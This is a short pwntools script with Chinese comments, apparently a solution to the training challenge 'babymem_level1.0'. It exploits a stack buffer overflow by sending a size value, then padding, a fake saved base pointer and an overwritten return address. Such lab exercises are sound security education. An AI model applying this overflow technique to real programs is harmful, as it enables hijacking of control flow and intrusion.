#!/usr/bin/env python3
from pwn import *

# 设置架构
context.arch = 'amd64'

# 创建一个进程对象 运行二进制文件
p = process('/challenge/babymem_level1.0')

# p.recvall()

p.send(b'200')

# p.recvall()

# 填充部分
padding = b'A' * 70

# 基指针填充部分
base_pointer_padding = b'B' * 8

# 返回地址 0x000000000000152C
return_address = p64(0x152C)

# 构造输入
payload = padding + base_pointer_padding + return_address

# 发送 payload
p.send(payload)

# 接收并打印所有数据
print(p.recvall().decode())